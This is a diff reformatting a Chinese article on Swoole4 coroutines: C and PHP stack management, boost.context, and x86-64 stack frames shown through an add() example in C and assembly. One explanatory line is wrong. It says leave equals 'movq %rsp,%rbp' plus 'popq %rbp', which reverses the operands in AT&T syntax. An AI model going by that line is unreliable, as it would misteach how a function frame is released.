 •API层是提供给用户使用的协程相关函数，比如go()函数用于创建协程；Co::yield()使得当前协程让出CPU；Co::resume()可恢复某个协程执行；
+
 •Swoole4协程需要同时管理c栈与php栈，Coroutine用于管理c栈，PHPCoroutine用于管理php栈；其中Coroutine()，yield()，resume()实现了c栈的创建以及换入换出；create_func()，on_yield()，on_resume()实现了php栈的创建以及换入换出；
+
 •Swoole4在管理c栈时，用到了 boost.context库，make_fcontext()和jump_fcontext()函数均使用汇编语言编写，实现了c栈上下文的创建以及切换；
+
 •Swoole4对boost.context进行了简单封装，即Context层，Context()，SwapIn()以及SwapOut()
 
 对应c栈的创建以及换入换出。
 
 深入理解C栈
 
-  函数是对代码的封装，对外暴露的只是一组指定的参数和一个可选的返回值；假设函数P调用函数Q，Q执行后返回函数P，实现该函数调用需要考虑以下三点：
+函数是对代码的封装，对外暴露的只是一组指定的参数和一个可选的返回值；假设函数P调用函数Q，Q执行后返回函数P，实现该函数调用需要考虑以下三点：
+
 •指令跳转：进入函数Q的时候，程序计数器必须被设置为Q的代码的起始地址；在返回时，程序计数器需要设置为P中调用Q后面那条指令的地址；
+
 •数据传递：P能够向Q提供一个或多个参数，Q能够向P返回一个值；
+
 •内存分配与释放：Q开始执行时，可能需要为局部变量分配内存空间，而在返回前，又需要释放这些内存空间；
 
-  大多数语言的函数调用都采用了栈结构实现，函数的调用与返回即对应的是一系列的入栈与出栈操作，我们通常称之为函数栈帧（stack frame）。示意图如下：
+大多数语言的函数调用都采用了栈结构实现，函数的调用与返回即对应的是一系列的入栈与出栈操作，我们通常称之为函数栈帧（stack frame）。示意图如下：
 
+上面提到的程序计数器即寄存器%rip，另外还有两个寄存器需要重点关注：%rbp指向栈帧底部，%rsp指向栈帧顶部。
 
-image
-
-  上面提到的程序计数器即寄存器%rip，另外还有两个寄存器需要重点关注：%rbp指向栈帧底部，%rsp指向栈帧顶部。
-
-  下面将通过具体的代码事例，为读者讲解函数栈帧。c代码与汇编代码如下：
+下面将通过具体的代码事例，为读者讲解函数栈帧。c代码与汇编代码如下：
+```
 int add(int x, int y)
 {
     int a, b;
@@ -22923,12 +22467,18 @@ add：
     addl    %edx, %eax
     popq    %rbp
     ret
+```
 
-  分析汇编代码：
+分析汇编代码：
+
 •main函数与add函数入口，首先将寄存器%rbp压入栈中用于保存其值，其次移动%rbp指向当前栈顶部（此时%rbp，%rsp都指向栈顶，开始新的函数栈帧）；
+
 •main函数"subq $16, %rsp"，是为main函数栈帧预留16个字节的内存空间；
+
 •调用add函数时，第一个参数和第二个参数分别保存在寄存器%edi和%esi，返回值保存在寄存器%eax；
+
 •call指令用于函数调用，实现了两个功能：寄存器%rip压入栈中，跳转到新的代码位置；
+
 •ret指令用于函数返回，弹出栈顶内容到寄存器%rip，依次实现代码跳转；
 •leave指令等同于两条指令：movq %rsp,%rbp和popq %rbp，用于释放main函数栈帧，恢复前一个函数栈帧；
 •注意add函数栈帧，并没有为其分配空间，寄存器%rsp和%rbp都指向栈帧底部；根本因为是add函数没有调用其他函数。
